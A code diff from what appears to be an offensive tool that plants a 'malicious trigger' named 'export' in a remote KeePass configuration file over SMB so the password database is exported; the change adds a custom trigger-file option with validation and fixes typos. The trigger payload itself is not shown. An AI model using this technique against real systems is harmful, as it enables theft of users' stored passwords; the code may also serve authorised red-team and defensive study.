@@ -205,10 +205,26 @@ def add_trigger(options):
     parser = etree.XMLParser(remove_blank_text=True)
     config_root = etree.fromstring(config_file_content.encode(), parser)
     # get malicious trigger XML from local file
-    cwd = Path.cwd()
-    mod_path = Path(__file__).parent
-    src_path_1 = (mod_path / '../data/export_database_trigger.xml').resolve()
-    trigger_root = etree.parse(src_path_1, parser).getroot()
+    if options.trigger_path:
+        if not os.path.exists(options.trigger_path):
+            print_error('The specified XML trigger file does not exist')
+            exit(1)
+        trigger_local_path = options.trigger_path
+    else:
+        cwd = Path.cwd()
+        mod_path = Path(__file__).parent
+        trigger_local_path = (mod_path / '../data/export_database_trigger.xml').resolve()
+
+    try:
+        trigger_root = etree.parse(trigger_local_path, parser).getroot()
+        print("trigger root is {}".format(trigger_root))
+    except:
+        print_error("The specified trigger file does not look like a valid XML..")
+        exit(1)
+
+    if trigger_root.tag != "Trigger":
+        print_error("The root tag is not Trigger {}".format(trigger_root.tag))
+        exit(1)
     # insert trigger XML inside config XML
     elem = config_root.find('./Application/TriggerSystem/Triggers')
     elem.text = None
@@ -228,9 +244,9 @@ def add_trigger(options):
         raise
 
     if 'export' in get_triggers_names(smb_connection, share, config_file_path):
-        print_success("Malicious trigger 'export' successfully added to KeePass configuration file (it may be deleted if KeePass is already running).")
+        print_success("Malicious trigger 'export' successfully added to KeePass configuration file (it may be deleted if KeePass is already running)")
     else:
-        print_error("Unokwn error while adding trigger 'export' to KeePass configuration file.")
+        print_error("Unknown error while adding trigger 'export' to KeePass configuration file")
 
 
 def clean_trigger(options):
